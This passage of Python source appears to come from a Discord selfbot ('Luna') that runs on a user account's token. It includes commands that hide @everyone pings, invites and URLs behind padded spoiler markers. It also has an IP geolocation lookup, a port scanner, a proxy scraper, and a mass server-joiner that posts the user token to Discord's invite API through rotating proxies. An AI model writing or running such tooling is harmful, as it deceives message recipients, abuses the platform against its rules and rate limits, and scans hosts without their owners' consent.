		charTT = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
		await channel.send(message + charTT + user)

		embed = discord.Embed(title=f"Hidden Everyone", description=f"```\nPing sent!\n\nChannel ID        » {channel_id}\nChannel Name      » {cchannel.name}\nMessage           » {message}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "hiddeninvite",
					usage="<channel_id> <invite> <message>",
					description = "hide the invite")
	async def hiddeninvite(self, luna, channel_id: int, invite, *, message):
		await luna.message.delete()

		cchannel = await self.bot.fetch_channel(channel_id)

		channel = self.bot.get_channel(channel_id)
		charTT = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
		await channel.send(message + charTT + invite)

		embed = discord.Embed(title=f"Hidden Ping", description=f"```\nPing sent!\n\nChannel ID        » {channel_id}\nChannel Name      » {cchannel.name}\nInvite            » {invite}\nMessage           » {message}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "hiddenurl",
					usage="<channel_id> <url> <message>",
					description = "Hide the url")
	async def hiddenurl(self, luna, channel_id: int, url, *, message):
		await luna.message.delete()

		cchannel = await self.bot.fetch_channel(channel_id)

		channel = self.bot.get_channel(channel_id)
		charTT = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
		await channel.send(message + charTT + url)

		embed = discord.Embed(title=f"Hidden Ping", description=f"```\nPing sent!\n\nChannel ID        » {channel_id}\nChannel Name      » {cchannel.name}\nURL               » {url}\nMessage           » {message}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "channels",
					usage="[guild_id]",
					description = "Show all the channels")
	async def channels(self, luna, server_id:int=None):
		await luna.message.delete()
		if server_id is None:
			server = discord.utils.get(luna.bot.guilds, id=luna.guild.id)
		else: 
			server = discord.utils.get(luna.bot.guilds, id=server_id)
		channels = server.channels
		channel_list = []
		for channel in channels:
			channel_list.append(channel)
		embed = discord.Embed(title=f"Channels in {server}", description='\n'.join([f"{ch.name}" for ch in channel_list]) or 'None', color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "firstmsg",
					usage="[#channel]",
					description = "First message")
	async def firstmsg(self, luna, channel: discord.TextChannel = None):
		await luna.message.delete()
		if channel is None:
			channel = luna.channel
		first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
		embed = discord.Embed(title="First Message", description=f"[Jump]({first_message.jump_url})", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "compareservers",
					usage="<serverid1> <serverid2>",
					description = "Checks if members are in the same server")
	async def compareservers(self, luna, server_id:int, server_id_2:int):
		await luna.message.delete()

		server_1 = self.bot.get_guild(server_id)
		server_2 = self.bot.get_guild(server_id_2)
		output = ""
		count = 0
		for member in server_1.members:
			if member in server_2.members:
				output += "{}\n".format(str(member.mention))
				count += 1

		embed = discord.Embed(title=f"```\nMembers in the same Server » {count}```", url=titleurlvar(), description=f"```\n{server_1} - {server_2}\n``````\n{output}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "bots",
					usage="",
					description = "Show all bots in the guild")
	async def bots(self, luna):
		await luna.message.delete()
		bots = []
		for member in luna.guild.members:
			if member.bot:
				bots.append(str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
		botslist = f"{', '.join(bots)}".replace(',', "\n")
		embed = discord.Embed(title=f"Bots ({len(bots)})", url=titleurlvar(), description=f"{botslist}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "guildicon",
					usage="",
					description = "Show the guild icon")
	async def guildicon(self, luna):
		await luna.message.delete()
		embed = discord.Embed(title=luna.guild.name, url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=luna.guild.icon_url)
		await send(luna, embed)

	@commands.command(name = "guildbanner",
					usage="",
					description = "Show the guild banner")
	async def guildbanner(self, luna):
		await luna.message.delete()
		embed = discord.Embed(title=luna.guild.name, url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=luna.guild.banner_url)
		await send(luna, embed)

	@commands.command(name = "tts",
					usage="<language> <text>",
					description = "Text to speech")
	async def tts(self, luna, lang, *, text: str):
		await luna.message.delete()
		tts = gTTS(text, lang=lang)
		filename = f'{text}.mp3'
		tts.save(filename)
		await luna.send(file=discord.File(fp=filename, filename=filename))
		if os.path.exists(filename):
			os.remove(filename)

	@commands.command(name = "qrcode",
					usage="<text>",
					description = "Create a QR code")
	async def qrcode(self, luna, *, text:str):
		await luna.message.delete()

		with open('./config.json') as f:
			config = json.load(f)
		deletetimer = int(config.get('deletetimer'))

		qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
		)
		qr.add_data(text)
		qr.make(fit=True)
		img = qr.make_image(fill_color='black', back_color='white')
		filename = f'lunaqr.png'
		img.save(filename)
		await luna.send(file=discord.File(fp=filename, filename=filename), delete_after=deletetimer)
		if os.path.exists(filename):
			os.remove(filename)

bot.add_cog(ToolsCog(bot))

class NettoolCog(commands.Cog, name="Nettool commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "ping",
					aliases=['latency'],
					usage="",
					description = "Display the latency")
	async def ping(self, luna):
		await luna.message.delete()
		if mode() == 2:
			before = time.monotonic()
			sent = await luna.send(f"```ini\n[ Latency ]\n\nPinging...\n\n[ {footervar()} ]```")
			ping = (time.monotonic() - before) * 100
			await sent.edit(content=f"```ini\n[ Latency ]\n\nAPI Latency\n{int(ping)}ms\n\n[ {footervar()} ]```")
		if mode() == 3:
			before = time.monotonic()
			sent = await luna.send(f"> **Latency**\n> \n> Pinging...\n> \n> {footervar()}")
			ping = (time.monotonic() - before) * 100
			await sent.edit(content=f"> **Latency**\n> \n> API Latency\n> {int(ping)}ms\n> \n> {footervar()}")
		else:
			embed = discord.Embed(title="Latency", url=titleurlvar(), description=f"```\nPinging...```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			before = time.monotonic()
			sent = await luna.send(embed=embed)
			ping = (time.monotonic() - before) * 100
			embed = discord.Embed(title="Latency", url=titleurlvar(), description=f"```\nAPI Latency\n{int(ping)}ms```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await sent.edit(embed=embed)

	@commands.command(name = "ip",
						usage="",
						description = "Display IP information")
	async def ip(self, luna, ip:str):
		await luna.message.delete()
		if ip is None:
			await luna.send("Please specify a IP address")
			return
		else:
			try:
				with requests.session() as ses:
					resp = ses.get(f'https://ipinfo.io/{ip}/json')
					if "Wrong ip" in resp.text:
						await luna.send("Invalid IP address")
						return
					else:
						try:
							j = resp.json()
							embed = discord.Embed(title=f"IP » {ip}", url=titleurlvar(), description=f'```\nCity\n{j["city"]}\n``````\nRegion\n{j["region"]}\n``````\nCountry\n{j["country"]}\n``````\nCoordinates\n{j["loc"]}\n``````\nPostal\n{j["postal"]}\n``````\nTimezone\n{j["timezone"]}\n``````\nOrganization\n{j["org"]}```', color=hexcolorvar())
							embed.set_thumbnail(url=imagevar())
							embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
							embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
							embed.set_image(url=largeimagevar())
							await send(luna, embed)
						except discord.HTTPException:
							await luna.send(
								f'```IP\n{ip}\n\nCity\n{j["city"]}\n``````\nRegion\n{j["region"]}\n``````\nCountry\n{j["country"]}\n``````\nCoordinates\n{j["loc"]}\n``````\nPostal\n{j["postal"]}\n``````\nTimezone\n{j["timezone"]}\n``````\nOrganization\n{j["org"]}```')
			except Exception as e:
				await luna.send(f"Error: {e}")				

	@commands.command(name="tcpping", usage="<ip> <port>", description="Checks if host is online")
	async def tcpping(self, luna, ip, port):
		await luna.message.delete()
		if ip is None:
			await luna.send("Please specify a IP address")
			return
		if port is None:
			await luna.send("Please specify a port")
			return
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(0.3)
		try:
			sock.connect((ip, int(port)))
		except:
			embed = discord.Embed(title="TCP-Ping", description=f"```Status » Offline\n``````\nIP » {ip}\n``````\nPort » {port}\n```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		else:
			embed = discord.Embed(title="TCP-Ping", description=f"```Status » Online\n``````\nIP » {ip}\n``````\nPort » {port}\n```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name="portscan", usage="<ip>", description="Checks for common open ports")
	async def portscan(self, luna, ip):
		await luna.message.delete()
		if ip is None:
			await luna.send("Please specify an IP address")
			return
		ports = ["10","12","13","14","16","17","18","20","21","22","23","25","40","42","45","47","48","50","53","80","81","110","139","389","443","445","996","1433","1521","1723","3066","3072","3306","3389","5900","8080","8181","65530","65535"]
		open_ports = []
		for port in ports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(0.2)
			try:
				sock.connect((ip, int(port)))
			except:
				pass
			else:
				sock.close()
				open_ports.append(port)

		embed = discord.Embed(title="Port Scanner", description=f'```\nIP » {ip}\n``````\nPorts Checked » {",".join(ports)}\n``````\nOpen Ports » {",".join(open_ports)}\n```', color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)


	@commands.command(name="resolve", usage="<url>", description="Get the url host IP")
	async def resolve(self, luna, url):
		await luna.message.delete()
		import socket
		new_url = ""
		if url is None:
			await luna.send("Please specify a URL")
			return
		if url.startswith("https://"):
			new_url = url.replace("https://", "")
		elif url.contains("http://"):
			new_url = url.replace("http://", "")
		
		try:
			ip = socket.gethostbyname(new_url)
		except:
			await luna.send("URL is invalid")
			return
		embed = discord.Embed(title="Host Resolver", description=f"```\nURL » {url}\n``````\nIP » {ip}\n```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name="scrapeproxies", usage="", aliases=['proxyscrape', 'scrapeproxy'],description="Scrape for proxies")
	async def scrapeproxies(self, luna):
		await luna.message.delete()
		embed = discord.Embed(title="Scrapeproxies", description=f"```\nSaved all scraped proxies in data/proxies.```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)
		if not os.path.exists('data/proxies'):
			os.makedirs('data/proxies')
		file = open("data/proxies/http.txt", "a+")
		res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
		proxies = []
		for proxy in res.text.split('\n'):
			proxy = proxy.strip()
			if proxy:
				proxies.append(proxy)
		for p in proxies:
			file.write((p)+"\n")
		file = open("data/proxies/https.txt", "a+")
		res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
		proxies = []
		for proxy in res.text.split('\n'):
			proxy = proxy.strip()
			if proxy:
				proxies.append(proxy)
		for p in proxies:
			file.write((p)+"\n")
		file = open("data/proxies/socks4.txt", "a+")
		res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
		proxies = []
		for proxy in res.text.split('\n'):
			proxy = proxy.strip()
			if proxy:
				proxies.append(proxy)
		for p in proxies:
			file.write((p)+"\n")
		file = open("Proxies/socks5.txt", "a+")
		res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
		proxies = []
		for proxy in res.text.split('\n'):
			proxy = proxy.strip()
			if proxy:
				proxies.append(proxy)
		for p in proxies:
			file.write((p)+"\n")

bot.add_cog(NettoolCog(bot))

class UtilsCog(commands.Cog, name="Util commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "serverjoiner",
					aliases=['joinservers', 'jservers', 'joinserver', 'joininvites'],
					usage="",
					description = "Join all invites in data/invites.txt")
	async def serverjoiner(self, luna):
		await luna.message.delete()
		if riskmode() == "on":

			if file_exist('./data/invites.txt'):
				pass
			else:
				file = open("data/invites.txt", "w") 
				file.write("Put the invites of the servers you want to join here one after another") 
				file.close()
				embed = discord.Embed(title="Server Joiner", url=titleurlvar(), description=f"```\nNo invites.txt has been found, so it has been created.\nPut all your invites there that you want to join.```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return

			if os.stat("data/invites.txt").st_size == 0:
				embed = discord.Embed(title="Server Joiner", url=titleurlvar(), description=f"```\ninvites.txt is empty...```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return
			else:
				file = open("data/invites.txt", "r")
				nonempty_lines = [line.strip("\n") for line in file if line != "\n"]
				line_count = len(nonempty_lines)
				file.close()

				with open('./config.json') as f:
					config = json.load(f)
				token = config.get('token')

				embed = discord.Embed(title="Server Joiner", url=titleurlvar(), description=f"```\nFound {line_count} invites in invites.txt\nJoining provided invites...```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

				with open("data/invites.txt","r+") as f:
					for line in f:
						invite = line.strip("\n")
						invite = invite.replace('https://discord.gg/', '')
						try:
							async with httpx.AsyncClient() as client:
								await client.post(f'https://canary.discord.com/api/v8/invites/{invite}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
								printevent(f"Joined {invite}")
								await asyncio.sleep(0.5)
						except Exception:
							printerror(f"Failed to join {invite}")
							pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "proxyserverjoiner",
					usage="",
					description = "Join all invites in data/invites.txt using proxies")
	async def proxyserverjoiner(self, luna):
		await luna.message.delete()
		if riskmode() == "on":

			if file_exist('./data/invites.txt'):
				pass
			else:
				file = open("data/invites.txt", "w") 
				file.write("Put the invites of the servers you want to join here one after another") 
				file.close()
				embed = discord.Embed(title="Server Joiner [PROXY]", url=titleurlvar(), description=f"```\nNo invites.txt has been found, so it has been created.\nPut all your invites there that you want to join.```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return

			if os.stat("data/invites.txt").st_size == 0:
				embed = discord.Embed(title="Server Joiner [PROXY]", url=titleurlvar(), description=f"```\ninvites.txt is empty...```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return
			else:
				file = open("data/invites.txt", "r")
				nonempty_lines = [line.strip("\n") for line in file if line != "\n"]
				line_count = len(nonempty_lines)
				file.close()

				with open('./config.json') as f:
					config = json.load(f)
				token = config.get('token')

				proxies = open('data/proxies.txt', 'r')
			
				proxylist = []
				
				for p, _proxy in enumerate(proxies):
					proxy = _proxy.split('\n')[0]
					proxylist.append(proxy)

				embed = discord.Embed(title="Server Joiner [PROXY]", url=titleurlvar(), description=f"```\nFound {line_count} invites in invites.txt\nJoining provided invites...```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

				with open("data/invites.txt","r+") as f:
					for line in f:
						invite = line.strip("\n")
						invite = invite.replace('https://discord.gg/', '')
						try:
							async with httpx.AsyncClient() as client:
								await client.post(f'https://canary.discord.com/api/v8/invites/{invite}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
								printevent(f"[PROXY] Joined {invite}")
								await asyncio.sleep(0.5)
						except Exception:
							printerror(f"[PROXY] Failed to join {invite}")
							pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "addemoji",
					usage="<emoji_name> <image_url>",
					description = "Add an emoji")
	@has_permissions(manage_emojis=True)
	async def addemoji(self, luna, emoji_name, image_url=None):
		await luna.message.delete()
		if luna.message.attachments:
			image = await luna.message.attachments[0].read()
		elif image_url:
			async with aiohttp.ClientSession() as session:
				async with session.get(image_url) as resp:
					image = await resp.read()
		await luna.guild.create_custom_emoji(name=emoji_name, image=image)
		embed = discord.Embed(title="Emoji Added", url=titleurlvar(), description=f"{emoji_name}", color=hexcolorvar())
		embed.set_thumbnail(url=image_url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "editemoji",
					usage="<emoji> <new_name>",
					description = "Edit an emoji")
	@has_permissions(manage_emojis=True)
	async def editemoji(self, luna, emoji: discord.Emoji, new_name):
		await luna.message.delete()
		oldname = emoji.name
		await emoji.edit(name=new_name)
		embed = discord.Embed(title="Emoji Edited", url=titleurlvar(), description=f"{oldname} to {new_name}", color=hexcolorvar())
		embed.set_thumbnail(url=emoji.url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "delemoji",
					usage="<emoji>",
					description = "Delete an emoji")
	@has_permissions(manage_emojis=True)
	async def delemoji(self, luna, emoji: discord.Emoji):
		await luna.message.delete()
		name = emoji.name
		emojiurl = emoji.url
		await emoji.delete()
		embed = discord.Embed(title="Emoji Deleted", url=titleurlvar(), description=f"{name}", color=hexcolorvar())
		embed.set_thumbnail(url=emojiurl)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)
	
	@commands.command(name = "stealemoji",
					aliases = ['stealemojis'],
					usage="<guild_id>",
					description = "Steal all emojis from a guild")
	@has_permissions(manage_emojis=True)
	async def stealemoji(self, luna, guild_id):
		await luna.message.delete()
		if not os.path.exists('data/emojis'):
			os.makedirs('data/emojis')
		guild_id = int(guild_id)
		try:
			guildhit = self.bot.get_guild(guild_id)
		except Exception as e:
			if errorlog() == "console":
				printerror(f"{e}")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
			return


	@commands.command(name = 'playing', 
				usage="<text>", 
				description = "Change your activity to playing.")
	async def playing(self, luna, *, status: str = None):
		await luna.message.delete()
		if status is None:
			printerror("You didnt put a text to play")
		else:
			try:
				game = discord.Activity(type=0, name=f"{status}")
				await self.bot.change_presence(activity=game)
				embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nStatus changed to » Playing {status}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)


	@commands.command(name = 'streaming', 
				usage="<text>", 
				description = "Change your activity to streaming.")
	async def streaming(self, luna, *, status: str = None):
		await luna.message.delete()
		if status is None:
			printerror("You didnt put a text to stream")
		else:
			try:
				game = discord.Activity(type=1, name=f"{status}", url=streamurl())
				await self.bot.change_presence(activity=game)
				embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nStatus changed to » Streaming {status}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)


	@commands.command(name = 'listening', 
				usage="<text>", 
				description = "Change your activity to listening.")
	async def listening(self, luna, *, status: str = None):
		await luna.message.delete()
		if status is None:
			printerror("You didnt put a text to listen to")
		else:
			try:
				game = discord.Activity(type=2, name=f"{status}")
				await self.bot.change_presence(activity=game)
				embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nStatus changed to » Listening {status}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)

	@commands.command(name = 'watching', 
				usage="<text>", 
				description = "Change your activity to watching.")
	async def watching(self, luna, *, status: str = None):
		await luna.message.delete()
		if status is None:
			printerror("You didnt put a text to watch")
		else:
			try:
				game = discord.Activity(type=3, name=f"{status}")
				await self.bot.change_presence(activity=game)
				embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nStatus changed to » Watching {status}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
